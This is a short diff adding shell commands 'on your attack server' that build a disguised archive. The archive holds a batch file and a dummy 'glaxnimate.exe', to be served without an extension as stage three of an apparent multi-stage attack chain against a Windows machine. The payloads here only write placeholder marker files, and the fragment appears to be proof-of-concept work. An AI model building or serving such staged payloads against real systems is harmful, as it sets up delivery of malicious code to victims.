@@ -1,0 +1,5 @@
+# On your attack server, build the TAR:
+echo "echo Stage 3: Glaxnimate executing > C:\temp\stage3.txt && timeout /t 3 && echo Stage 4 prep > C:\temp\stage4.txt" > glaxnimate.bat
+echo @echo off > glaxnimate.exe  # Dummy for now
+tar -cf socket.tar glaxnimate.bat glaxnimate.exe
+# Serve socket.tar as socket (no extension needed)
